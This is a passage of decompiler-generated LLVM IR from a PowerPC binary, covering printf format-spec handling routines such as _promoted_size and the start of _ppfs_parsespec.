  %v2_1000ebc8 = add i32 %v1_1000ebc8, 4
  %v3_1000ebc8 = inttoptr i32 %v2_1000ebc8 to i32*
  store i32 %v0_1000ebc8, i32* %v3_1000ebc8, align 4
  %v0_1000ed0c5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000ed0c.preheader

dec_label_pc_1000ed0c.preheader:                  ; preds = %dec_label_pc_1000eb7c, %dec_label_pc_1000ebc0
  %v0_1000ed0c5 = phi i32 [ %v2_1000ebac, %dec_label_pc_1000eb7c ], [ %v0_1000ed0c5.pre, %dec_label_pc_1000ebc0 ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000ed0c6 = add i32 %v0_1000ed0c5, 28
  %v2_1000ed0c7 = inttoptr i32 %v1_1000ed0c6 to i32*
  %v3_1000ed0c8 = load i32, i32* %v2_1000ed0c7, align 4
  store i32 %v3_1000ed0c8, i32* %r0.global-to-local, align 4
  %v2_1000ed109 = icmp sgt i32 %v3_1000ed0c8, 0
  %v3_1000ed1010 = icmp slt i32 %v3_1000ed0c8, 0
  store i1 %v3_1000ed1010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000ed109, label %dec_label_pc_1000ebd4, label %dec_label_pc_1000ed5c

dec_label_pc_1000ebd4:                            ; preds = %dec_label_pc_1000ed0c.preheader, %dec_label_pc_1000ed08
  %v2_1000ece8 = phi i32 [ %v0_1000ed0c, %dec_label_pc_1000ed08 ], [ %v0_1000ed0c5, %dec_label_pc_1000ed0c.preheader ]
  %v0_1000ebd4 = phi i32 [ %v1_1000ed08, %dec_label_pc_1000ed08 ], [ 0, %dec_label_pc_1000ed0c.preheader ]
  %v1_1000ebd4 = mul i32 %v0_1000ebd4, 4
  %v2_1000ebd8 = add i32 %v1_1000ebd4, %v2_1000ece8
  store i32 %v2_1000ebd8, i32* %r9.global-to-local, align 4
  %v1_1000ebdc = add i32 %v2_1000ebd8, 40
  %v2_1000ebdc = inttoptr i32 %v1_1000ebdc to i32*
  %v3_1000ebdc = load i32, i32* %v2_1000ebdc, align 4
  store i32 %v3_1000ebdc, i32* %r0.global-to-local, align 4
  %v2_1000ebe0 = icmp sgt i32 %v3_1000ebdc, 8
  %v3_1000ebe0 = icmp eq i32 %v3_1000ebdc, 8
  store i1 %v2_1000ebe0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ebe0, label %dec_label_pc_1000ed08, label %dec_label_pc_1000ebe8

dec_label_pc_1000ebe8:                            ; preds = %dec_label_pc_1000ebd4
  %v1_1000ebe8 = add i32 %v2_1000ece8, 76
  store i32 %v1_1000ebe8, i32* %r10.global-to-local, align 4
  br i1 %v2_1000ebe0, label %dec_label_pc_1000ec04, label %dec_label_pc_1000ebf0

dec_label_pc_1000ebf0:                            ; preds = %dec_label_pc_1000ebe8
  %v2_1000ebf0 = icmp sgt i32 %v3_1000ebdc, 2
  store i1 %v2_1000ebf0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000ebdc, 3
  br i1 %tmp23, label %dec_label_pc_1000eccc, label %dec_label_pc_1000ec1c

dec_label_pc_1000ec04:                            ; preds = %dec_label_pc_1000ebe8
  %v2_1000ec04 = icmp sgt i32 %v3_1000ebdc, 1024
  store i1 %v2_1000ec04, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000ebdc, 1025
  br i1 %tmp24, label %dec_label_pc_1000eccc, label %dec_label_pc_1000ec10

dec_label_pc_1000ec10:                            ; preds = %dec_label_pc_1000ec04
  %v2_1000ec10 = icmp sgt i32 %v3_1000ebdc, 2048
  %v3_1000ec10 = icmp eq i32 %v3_1000ebdc, 2048
  store i1 %v2_1000ec10, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ec10, label %dec_label_pc_1000ec24, label %dec_label_pc_1000ec18

dec_label_pc_1000ec18:                            ; preds = %dec_label_pc_1000ec10
  %v2_1000ec18 = icmp sgt i32 %v3_1000ebdc, 2055
  %v3_1000ec18 = icmp eq i32 %v3_1000ebdc, 2055
  store i1 %v2_1000ec18, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ec18, label %dec_label_pc_1000ec80, label %dec_label_pc_1000eccc

dec_label_pc_1000ec1c:                            ; preds = %dec_label_pc_1000ebf0
  %v3_1000ebfc = icmp eq i32 %v3_1000ebdc, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ebfc, label %dec_label_pc_1000ec80, label %dec_label_pc_1000eccc

dec_label_pc_1000ec24:                            ; preds = %dec_label_pc_1000ec10
  %v2_1000ec24 = inttoptr i32 %v1_1000ebe8 to i8*
  %v3_1000ec24 = load i8, i8* %v2_1000ec24, align 1
  %v4_1000ec24 = zext i8 %v3_1000ec24 to i32
  %v2_1000ec28 = icmp ugt i8 %v3_1000ec24, 6
  store i1 %v2_1000ec28, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000ec24, 2
  %v1_1000ec2c = zext i8 %tmp28 to i32
  store i32 %v1_1000ec2c, i32* %r9.global-to-local, align 4
  %v2_1000ec30 = add nuw nsw i32 %v1_1000ec2c, %v4_1000ec24
  store i32 %v2_1000ec30, i32* %r0.global-to-local, align 4
  %v1_1000ec34 = trunc i32 %v2_1000ec30 to i8
  store i8 %v1_1000ec34, i8* %v2_1000ec24, align 1
  %v0_1000ec38 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000ec38, label %dec_label_pc_1000ec58, label %dec_label_pc_1000ec3c

dec_label_pc_1000ec3c:                            ; preds = %dec_label_pc_1000ec24
  %v0_1000ec3c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ec3c = urem i32 %v0_1000ec3c, 256
  store i32 %v1_1000ec3c, i32* %r9.global-to-local, align 4
  %v0_1000ec40 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ec40 = add i32 %v0_1000ec40, 8
  %v2_1000ec40 = inttoptr i32 %v1_1000ec40 to i32*
  %v3_1000ec40 = load i32, i32* %v2_1000ec40, align 4
  %v1_1000ec44 = mul nuw nsw i32 %v1_1000ec3c, 4
  store i32 %v1_1000ec44, i32* %r0.global-to-local, align 4
  %v1_1000ec48 = add nuw nsw i32 %v1_1000ec3c, 2
  store i32 %v1_1000ec48, i32* %r9.global-to-local, align 4
  %v2_1000ec4c = add i32 %v3_1000ec40, %v1_1000ec44
  store i32 %v2_1000ec4c, i32* %r11.global-to-local, align 4
  %v1_1000ec50 = trunc i32 %v1_1000ec48 to i8
  %v2_1000ec50 = load i32, i32* @r3, align 4
  %v3_1000ec50 = add i32 %v2_1000ec50, 76
  %v4_1000ec50 = inttoptr i32 %v3_1000ec50 to i8*
  store i8 %v1_1000ec50, i8* %v4_1000ec50, align 1
  br label %dec_label_pc_1000ec6c

dec_label_pc_1000ec58:                            ; preds = %dec_label_pc_1000ec24
  %v0_1000ec58 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ec58 = add i32 %v0_1000ec58, 4
  %v2_1000ec58 = inttoptr i32 %v1_1000ec58 to i32*
  %v3_1000ec58 = load i32, i32* %v2_1000ec58, align 4
  %v1_1000ec5c = add i32 %v3_1000ec58, 7
  store i32 %v1_1000ec5c, i32* %r9.global-to-local, align 4
  %v1_1000ec60 = call i32 @__asm_rlwinm(i32 %v1_1000ec5c, i32 0, i32 0, i32 28)
  store i32 %v1_1000ec60, i32* %r11.global-to-local, align 4
  %v1_1000ec64 = add i32 %v1_1000ec60, 8
  store i32 %v1_1000ec64, i32* %r0.global-to-local, align 4
  %v1_1000ec68 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ec68 = add i32 %v1_1000ec68, 4
  %v3_1000ec68 = inttoptr i32 %v2_1000ec68 to i32*
  store i32 %v1_1000ec64, i32* %v3_1000ec68, align 4
  br label %dec_label_pc_1000ec6c

dec_label_pc_1000ec6c:                            ; preds = %dec_label_pc_1000ec3c, %dec_label_pc_1000ec58
  %v0_1000ec6c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ec6c = inttoptr i32 %v0_1000ec6c to i32*
  %v2_1000ec6c = load i32, i32* %v1_1000ec6c, align 4
  store i32 %v2_1000ec6c, i32* %r9.global-to-local, align 4
  %v1_1000ec70 = add i32 %v0_1000ec6c, 4
  %v2_1000ec70 = inttoptr i32 %v1_1000ec70 to i32*
  %v3_1000ec70 = load i32, i32* %v2_1000ec70, align 4
  store i32 %v3_1000ec70, i32* %r10.global-to-local, align 4
  %v1_1000ec74 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ec74 = inttoptr i32 %v1_1000ec74 to i32*
  store i32 %v2_1000ec6c, i32* %v2_1000ec74, align 4
  %v0_1000ec78 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ec78 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ec78 = add i32 %v1_1000ec78, 4
  %v3_1000ec78 = inttoptr i32 %v2_1000ec78 to i32*
  store i32 %v0_1000ec78, i32* %v3_1000ec78, align 4
  br label %dec_label_pc_1000ed04

dec_label_pc_1000ec80:                            ; preds = %dec_label_pc_1000ec18, %dec_label_pc_1000ec1c
  store i32 %v1_1000ebe8, i32* %r10.global-to-local, align 4
  %v1_1000ec84 = add i32 %v2_1000ece8, 77
  %v2_1000ec84 = inttoptr i32 %v1_1000ec84 to i8*
  %v3_1000ec84 = load i8, i8* %v2_1000ec84, align 1
  %v4_1000ec84 = zext i8 %v3_1000ec84 to i32
  store i32 %v4_1000ec84, i32* %r11.global-to-local, align 4
  %v2_1000ec88 = icmp ugt i8 %v3_1000ec84, 8
  store i1 %v2_1000ec88, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000ec84, 7
  br i1 %tmp25, label %dec_label_pc_1000ecac, label %dec_label_pc_1000ec90

dec_label_pc_1000ec90:                            ; preds = %dec_label_pc_1000ec80
  %v1_1000ec90 = add i32 %v2_1000ece8, 84
  %v2_1000ec90 = inttoptr i32 %v1_1000ec90 to i32*
  %v3_1000ec90 = load i32, i32* %v2_1000ec90, align 4
  %v1_1000ec94 = mul nuw nsw i32 %v4_1000ec84, 8
  %v1_1000ec98 = add nuw nsw i32 %v1_1000ec94, 32
  %v2_1000ec9c = add i32 %v1_1000ec98, %v3_1000ec90
  store i32 %v2_1000ec9c, i32* %r9.global-to-local, align 4
  %v1_1000eca0 = add nuw nsw i32 %v4_1000ec84, 1
  store i32 %v1_1000eca0, i32* %r0.global-to-local, align 4
  %v1_1000eca4 = trunc i32 %v1_1000eca0 to i8
  store i8 %v1_1000eca4, i8* %v2_1000ec84, align 1
  br label %dec_label_pc_1000ed04

dec_label_pc_1000ecac:                            ; preds = %dec_label_pc_1000ec80
  %v1_1000ecac = add i32 %v2_1000ece8, 80
  %v2_1000ecac = inttoptr i32 %v1_1000ecac to i32*
  %v3_1000ecac = load i32, i32* %v2_1000ecac, align 4
  %v1_1000ecb0 = add i32 %v3_1000ecac, 7
  store i32 %v1_1000ecb0, i32* %r9.global-to-local, align 4
  %v1_1000ecb4 = call i32 @__asm_rlwinm(i32 %v1_1000ecb0, i32 0, i32 0, i32 28)
  store i32 %v1_1000ecb4, i32* %r9.global-to-local, align 4
  %v1_1000ecb8 = add i32 %v1_1000ecb4, 8
  store i32 %v1_1000ecb8, i32* %r0.global-to-local, align 4
  %v1_1000ecbc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ecbc = add i32 %v1_1000ecbc, 4
  %v3_1000ecbc = inttoptr i32 %v2_1000ecbc to i32*
  store i32 %v1_1000ecb8, i32* %v3_1000ecbc, align 4
  br label %dec_label_pc_1000ed04

dec_label_pc_1000eccc:                            ; preds = %dec_label_pc_1000ec18, %dec_label_pc_1000ec1c, %dec_label_pc_1000ec04, %dec_label_pc_1000ebf0
  %v2_1000eccc = inttoptr i32 %v1_1000ebe8 to i8*
  %v3_1000eccc = load i8, i8* %v2_1000eccc, align 1
  %v4_1000eccc = zext i8 %v3_1000eccc to i32
  store i32 %v4_1000eccc, i32* %r11.global-to-local, align 4
  %v2_1000ecd0 = icmp ugt i8 %v3_1000eccc, 8
  store i1 %v2_1000ecd0, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000eccc, 7
  br i1 %tmp26, label %dec_label_pc_1000ecf0, label %dec_label_pc_1000ecd8

dec_label_pc_1000ecd8:                            ; preds = %dec_label_pc_1000eccc
  %v1_1000ecd8 = add i32 %v2_1000ece8, 84
  %v2_1000ecd8 = inttoptr i32 %v1_1000ecd8 to i32*
  %v3_1000ecd8 = load i32, i32* %v2_1000ecd8, align 4
  %v1_1000ecdc = mul nuw nsw i32 %v4_1000eccc, 4
  %v2_1000ece0 = add i32 %v3_1000ecd8, %v1_1000ecdc
  store i32 %v2_1000ece0, i32* %r9.global-to-local, align 4
  %v1_1000ece4 = add nuw nsw i32 %v4_1000eccc, 1
  store i32 %v1_1000ece4, i32* %r0.global-to-local, align 4
  %v1_1000ece8 = trunc i32 %v1_1000ece4 to i8
  store i8 %v1_1000ece8, i8* %v2_1000eccc, align 1
  br label %dec_label_pc_1000ecfc

dec_label_pc_1000ecf0:                            ; preds = %dec_label_pc_1000eccc
  %v1_1000ecf0 = add i32 %v2_1000ece8, 80
  %v2_1000ecf0 = inttoptr i32 %v1_1000ecf0 to i32*
  %v3_1000ecf0 = load i32, i32* %v2_1000ecf0, align 4
  store i32 %v3_1000ecf0, i32* %r9.global-to-local, align 4
  %v1_1000ecf4 = add i32 %v3_1000ecf0, 4
  store i32 %v1_1000ecf4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ecf4, i32* %v2_1000ecf0, align 4
  br label %dec_label_pc_1000ecfc

dec_label_pc_1000ecfc:                            ; preds = %dec_label_pc_1000ecd8, %dec_label_pc_1000ecf0
  %v0_1000ecfc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ecfc = inttoptr i32 %v0_1000ecfc to i32*
  %v2_1000ecfc = load i32, i32* %v1_1000ecfc, align 4
  store i32 %v2_1000ecfc, i32* %r0.global-to-local, align 4
  %v1_1000ed00 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ed00 = inttoptr i32 %v1_1000ed00 to i32*
  store i32 %v2_1000ecfc, i32* %v2_1000ed00, align 4
  br label %dec_label_pc_1000ed04

dec_label_pc_1000ed04:                            ; preds = %dec_label_pc_1000ecac, %dec_label_pc_1000ec90, %dec_label_pc_1000ec6c, %dec_label_pc_1000ecfc
  %v0_1000ed04 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ed04 = add i32 %v0_1000ed04, 8
  store i32 %v1_1000ed04, i32* %r8.global-to-local, align 4
  %v0_1000ed08.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000ed0c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000ed08

dec_label_pc_1000ed08:                            ; preds = %dec_label_pc_1000ebd4, %dec_label_pc_1000ed04
  %v0_1000ed0c = phi i32 [ %v2_1000ece8, %dec_label_pc_1000ebd4 ], [ %v0_1000ed0c.pre, %dec_label_pc_1000ed04 ]
  %v0_1000ed08 = phi i32 [ %v0_1000ebd4, %dec_label_pc_1000ebd4 ], [ %v0_1000ed08.pre, %dec_label_pc_1000ed04 ]
  %v1_1000ed08 = add i32 %v0_1000ed08, 1
  store i32 %v1_1000ed08, i32* %r7.global-to-local, align 4
  %v1_1000ed0c = add i32 %v0_1000ed0c, 28
  %v2_1000ed0c = inttoptr i32 %v1_1000ed0c to i32*
  %v3_1000ed0c = load i32, i32* %v2_1000ed0c, align 4
  store i32 %v3_1000ed0c, i32* %r0.global-to-local, align 4
  %v2_1000ed10 = icmp slt i32 %v1_1000ed08, %v3_1000ed0c
  %v3_1000ed10 = icmp sgt i32 %v1_1000ed08, %v3_1000ed0c
  store i1 %v3_1000ed10, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000ed10, label %dec_label_pc_1000ebd4, label %dec_label_pc_1000ed5c

dec_label_pc_1000ed1c:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000ed20 = icmp ne i32 %v3_1000eb24, -2147483648
  %v4_1000ed20 = icmp eq i32 %v3_1000eb24, -2147483648
  store i1 %v3_1000ed20, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000ed20, label %dec_label_pc_1000ed28, label %dec_label_pc_1000ed3c

dec_label_pc_1000ed28:                            ; preds = %dec_label_pc_1000ed1c
  %v1_1000ed28 = add i32 %v0_1000eb1c, 36
  %v2_1000ed28 = inttoptr i32 %v1_1000ed28 to i8*
  %v3_1000ed28 = load i8, i8* %v2_1000ed28, align 1
  %v4_1000ed28 = zext i8 %v3_1000ed28 to i32
  %v1_1000ed2c = mul nuw nsw i32 %v4_1000ed28, 8
  %v2_1000ed30 = add i32 %v1_1000ed2c, %v1_1000eb20
  store i32 %v2_1000ed30, i32* %r9.global-to-local, align 4
  %v1_1000ed34 = add i32 %v2_1000ed30, -8
  %v2_1000ed34 = inttoptr i32 %v1_1000ed34 to i32*
  %v3_1000ed34 = load i32, i32* %v2_1000ed34, align 4
  store i32 %v3_1000ed34, i32* %r0.global-to-local, align 4
  store i32 %v3_1000ed34, i32* %v2_1000eb24, align 4
  %v0_1000ed3c.pre = load i32, i32* @r3, align 4
  %v1_1000ed40.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ed3c

dec_label_pc_1000ed3c:                            ; preds = %dec_label_pc_1000ed1c, %dec_label_pc_1000ed28
  %v1_1000ed40 = phi i32 [ -2147483648, %dec_label_pc_1000ed1c ], [ %v1_1000ed40.pre, %dec_label_pc_1000ed28 ]
  %v1_1000ed58 = phi i32 [ %v0_1000eb1c, %dec_label_pc_1000ed1c ], [ %v0_1000ed3c.pre, %dec_label_pc_1000ed28 ]
  %v1_1000ed3c = add i32 %v1_1000ed58, 4
  %v2_1000ed3c = inttoptr i32 %v1_1000ed3c to i32*
  %v3_1000ed3c = load i32, i32* %v2_1000ed3c, align 4
  store i32 %v3_1000ed3c, i32* %r0.global-to-local, align 4
  %v3_1000ed40 = icmp sgt i32 %v3_1000ed3c, %v1_1000ed40
  %v4_1000ed40 = icmp eq i32 %v3_1000ed3c, %v1_1000ed40
  store i1 %v3_1000ed40, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000ed40, label %dec_label_pc_1000ed48, label %dec_label_pc_1000ed5c

dec_label_pc_1000ed48:                            ; preds = %dec_label_pc_1000ed3c
  %v1_1000ed48 = add i32 %v1_1000ed58, 37
  %v2_1000ed48 = inttoptr i32 %v1_1000ed48 to i8*
  %v3_1000ed48 = load i8, i8* %v2_1000ed48, align 1
  %v4_1000ed48 = zext i8 %v3_1000ed48 to i32
  %v1_1000ed4c = mul nuw nsw i32 %v4_1000ed48, 8
  %v1_1000ed50 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ed50 = add i32 %v1_1000ed4c, %v1_1000ed50
  store i32 %v2_1000ed50, i32* %r9.global-to-local, align 4
  %v1_1000ed54 = add i32 %v2_1000ed50, -8
  %v2_1000ed54 = inttoptr i32 %v1_1000ed54 to i32*
  %v3_1000ed54 = load i32, i32* %v2_1000ed54, align 4
  store i32 %v3_1000ed54, i32* %r0.global-to-local, align 4
  store i32 %v3_1000ed54, i32* %v2_1000ed3c, align 4
  %v0_1000ed5c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000ed5c

dec_label_pc_1000ed5c:                            ; preds = %dec_label_pc_1000ed08, %dec_label_pc_1000ed0c.preheader, %dec_label_pc_1000ed3c, %dec_label_pc_1000ed48
  %v0_1000ed5c = phi i32 [ %v1_1000ed58, %dec_label_pc_1000ed3c ], [ %v0_1000ed5c.pre, %dec_label_pc_1000ed48 ], [ %v0_1000ed0c5, %dec_label_pc_1000ed0c.preheader ], [ %v0_1000ed0c, %dec_label_pc_1000ed08 ]
  %v1_1000ed5c = add i32 %v0_1000ed5c, 8
  %v2_1000ed5c = inttoptr i32 %v1_1000ed5c to i32*
  %v3_1000ed5c = load i32, i32* %v2_1000ed5c, align 4
  store i32 %v3_1000ed5c, i32* %r11.global-to-local, align 4
  %v2_1000ed60 = icmp sgt i32 %v3_1000ed5c, 0
  store i1 %v2_1000ed60, i1* %cr7_gt.global-to-local, align 1
  %v0_1000ed64 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000ed5c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000ed64)
  %v0_1000ed68 = load i32, i32* @r3, align 4
  %v1_1000ed68 = add i32 %v0_1000ed68, 16
  %v2_1000ed68 = inttoptr i32 %v1_1000ed68 to i32*
  %v3_1000ed68 = load i32, i32* %v2_1000ed68, align 4
  store i32 %v3_1000ed68, i32* %r0.global-to-local, align 4
  %v0_1000ed6c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ed6c = sub i32 0, %v0_1000ed6c
  store i32 %v1_1000ed6c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000ed74 = add i32 %v0_1000ed68, 8
  %v3_1000ed74 = inttoptr i32 %v2_1000ed74 to i32*
  store i32 %v1_1000ed6c, i32* %v3_1000ed74, align 4
  %v0_1000ed78 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ed78 = or i32 %v0_1000ed78, 8
  store i32 %v1_1000ed78, i32* %r0.global-to-local, align 4
  %v0_1000ed7c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ed7c = load i32, i32* @r3, align 4
  %v2_1000ed7c = add i32 %v1_1000ed7c, 20
  %v3_1000ed7c = inttoptr i32 %v2_1000ed7c to i32*
  store i32 %v0_1000ed7c, i32* %v3_1000ed7c, align 4
  %v1_1000ed80 = call i32 @__asm_rlwinm(i32 %v1_1000ed78, i32 0, i32 0, i32 30)
  store i32 %v1_1000ed80, i32* %r0.global-to-local, align 4
  %v1_1000ed84 = load i32, i32* @r3, align 4
  %v2_1000ed84 = add i32 %v1_1000ed84, 16
  %v3_1000ed84 = inttoptr i32 %v2_1000ed84 to i32*
  store i32 %v1_1000ed80, i32* %v3_1000ed84, align 4
  %v0_1000ed88 = load i32, i32* @r3, align 4
  ret i32 %v0_1000ed88

; uselistorder directives
  uselistorder i32 %v3_1000ed3c, { 1, 0, 2 }
  uselistorder i32 %v1_1000ed40, { 1, 0 }
  uselistorder i32 %v3_1000ed0c, { 1, 0, 2 }
  uselistorder i32 %v1_1000ed08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000ed0c, { 0, 2, 1 }
  uselistorder i32 %v4_1000ec84, { 1, 0, 2 }
  uselistorder i32 %v1_1000ec44, { 1, 0 }
  uselistorder i32 %v1_1000ec3c, { 2, 0, 1 }
  uselistorder i32 %v1_1000ebe8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000ebdc, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000ebd4, { 1, 0 }
  uselistorder i32 %v2_1000ece8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000ed0c5, { 1, 0, 2 }
  uselistorder i32 %v3_1000eb7c, { 1, 0, 2 }
  uselistorder i32 %v2_1000ebac, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000eb24, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000eb1c, { 1, 0, 2 }
  uselistorder i32 %v0_1000eb1c, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 0, 19, 9, 10, 11, 12, 1, 14, 15, 16, 17, 18 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 88, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed5c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ed3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed08, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed04, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ecfc, { 1, 0 }
  uselistorder label %dec_label_pc_1000eccc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000ec80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed0c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb7c, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb70, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000ed98

dec_label_pc_1000ed98:                            ; preds = %dec_label_pc_1000ed98, %entry
  %v0_1000ed98 = phi i32 [ ptrtoint (i32* @global_var_1001b320.1050 to i32), %entry ], [ %v1_1000ed98, %dec_label_pc_1000ed98 ]
  %v1_1000ed98 = add i32 %v0_1000ed98, -2
  %v2_1000ed98 = inttoptr i32 %v1_1000ed98 to i16*
  %v3_1000ed98 = load i16, i16* %v2_1000ed98, align 2
  %v4_1000ed98 = sext i16 %v3_1000ed98 to i32
  %v4_1000ed9c = icmp eq i32 %v4_1000ed98, %arg1
  %v3_1000eda0.not = icmp ule i32 %v1_1000ed98, ptrtoint (i32* @global_var_1001b308.1051 to i32)
  %brmerge = or i1 %v4_1000ed9c, %v3_1000eda0.not
  br i1 %brmerge, label %dec_label_pc_1000edac, label %dec_label_pc_1000ed98

dec_label_pc_1000edac:                            ; preds = %dec_label_pc_1000ed98
  %v2_1000edb4 = sub i32 %v1_1000ed98, ptrtoint (i32* @global_var_1001b308.1051 to i32)
  %v1_1000edbc = udiv i32 %v2_1000edb4, 2
  %v2_1000edbc = and i32 %v2_1000edb4, -2147483648
  %v3_1000edbc = or i32 %v1_1000edbc, %v2_1000edbc
  %v2_1000edc4 = add i32 %v3_1000edbc, ptrtoint (i32* @global_var_1001b320.1050 to i32)
  %v3_1000edc4 = inttoptr i32 %v2_1000edc4 to i8*
  %v4_1000edc4 = load i8, i8* %v3_1000edc4, align 1
  %v5_1000edc4 = zext i8 %v4_1000edc4 to i32
  ret i32 %v5_1000edc4

; uselistorder directives
  uselistorder i32 %v2_1000edb4, { 1, 0 }
  uselistorder i32 %v1_1000ed98, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1001b308.1051 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001b320.1050 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000edcc = load i32, i32* @lr, align 4
  store i32 %v0_1000edcc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000ede4 = add i32 %tmp, 16
  %v2_1000ede4 = inttoptr i32 %v1_1000ede4 to i32*
  %v3_1000ede4 = load i32, i32* %v2_1000ede4, align 4
  %v1_1000edec = and i32 %v3_1000ede4, 128
  store i32 %v1_1000edec, i32* %r6.global-to-local, align 4
  %v3_1000edec = icmp eq i32 %v1_1000edec, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000ee00 = add i32 %tmp, 24
  %v2_1000ee00 = inttoptr i32 %v1_1000ee00 to i32*
  %v3_1000ee00 = load i32, i32* %v2_1000ee00, align 4
  store i32 %v3_1000ee00, i32* @r26, align 4
  br i1 %v3_1000edec, label %dec_label_pc_1000ee08, label %dec_label_pc_1000ee20

dec_label_pc_1000ee08:                            ; preds = %entry
  %v2_1000ee08 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000ee74

dec_label_pc_1000ee18:                            ; preds = %dec_label_pc_1000f048
  %v1_1000ee18 = add i32 %v0_1000f018, 1
  store i32 %v1_1000ee18, i32* @r30, align 4
  br label %dec_label_pc_1000f060

